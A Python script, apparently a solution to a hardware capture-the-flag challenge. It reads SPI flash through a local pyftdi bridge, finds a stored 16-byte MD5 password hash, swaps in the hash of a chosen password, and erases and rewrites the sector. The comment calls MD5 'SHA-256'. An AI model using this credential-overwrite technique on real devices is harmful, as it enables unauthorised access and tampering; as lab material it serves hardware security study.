import socket
import json
import binascii
import struct
import copy
import hashlib


# INSTRUCTION BYTES
WRITE_ENABLE = 0x06
SECTOR_ERASE = 0x20
READ = 0x03
READ_SECURITY_REGISTER = 0x48
PAGE_PROGRAM = 0x02

PAGE_SIZE = 256

def new_pass(secret_value):
    # Hash the secret value using SHA-256
    hash_object = hashlib.md5()
    hash_object.update(secret_value.encode())  # Convert secret to bytes and hash it
    hashed_value = hash_object.digest()  # Get the hash as bytes

    hashed_value = list(hashed_value)
    return hashed_value

def write_pages(pages):
    for page_no in range(0, len(pages)):
        # Craft packet
        address = [0x00, page_no, 0x00]
        data = pages[page_no]
        packet = [PAGE_PROGRAM] + address + data      
        exchange([WRITE_ENABLE])
        exchange(packet)

def split_pages(original_list, chunk_size):
    return [original_list[i:i + chunk_size] for i in range(0, len(original_list), chunk_size)]


def exchange(hex_list, value=0):

    # Configure according to your setup
    host = '127.0.0.1'  # The server's hostname or IP address
    port = 1337        # The port used by the server
    cs=0 # /CS on A*BUS3 (range: A*BUS3 to A*BUS7)
    
    usb_device_url = 'ftdi://ftdi:2232h/1'

    # Convert hex list to strings and prepare the command data
    command_data = {
        "tool": "pyftdi",
        "cs_pin":  cs,
        "url":  usb_device_url,
        "data_out": [hex(x) for x in hex_list],  # Convert hex numbers to hex strings
        "readlen": value
    }
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        # Serialize data to JSON and send
        s.sendall(json.dumps(command_data).encode('utf-8'))
        
        # Receive and process response
        data = b''
        while True:
            data += s.recv(1024)
            if data.endswith(b']'):
                break
                
        response = json.loads(data.decode('utf-8'))
        #print(f"Received: {response}")
    return response

# Read Data
# [0x03, 0x00, 0x00, 0x00]: Data to send to memory
# 4096: Numbe of bytes to read back
mem_data = exchange([0x03, 0x00, 0x00, 0x00], 4096)


# Split data into entries based on null termination
from itertools import groupby

entries = [list(group) for k, group in groupby(mem_data, lambda x: x == 0) if not k]

# Find any entry with a size of 16
target_entry = next((sublist for sublist in entries if len(sublist) == 16), None)

print(target_entry)

# Find the start position of the target_entry in the original list
if target_entry:
    # Convert the list to a string for easier pattern matching
    input_str = ' '.join(map(str, mem_data))
    target_str = ' '.join(map(str, target_entry))

    start_pos = input_str.find(target_str)
    # Calculate the index by counting spaces
    index = input_str[:start_pos].count(' ')
else:
    index = None

print("Target sublist:", target_entry)
print("Start position in original hash:", index)

# Generate new hash
new_hash_list = new_pass('diogt')
print('New hash: ', new_hash_list)

# split memory into two parts, excluding the original MD5 Hash
part1 = mem_data[:index]
part2 = mem_data[index+16:]

# Add the new hash
new_mem_data = (part1 + new_hash_list + part2)

# Clean the memory and remove any empty bytes (0xFF)
new_mem_data = [x for x in new_mem_data if x != 255]


# split data into pages
pages = split_pages(new_mem_data, PAGE_SIZE)

print(f'Program pages with new logs..')

# ERASE SECTOR
exchange([WRITE_ENABLE])
exchange([SECTOR_ERASE, 0x00, 0x00, 0x00])

# Write modified data entires (multiple page program instructions)
write_pages(pages)







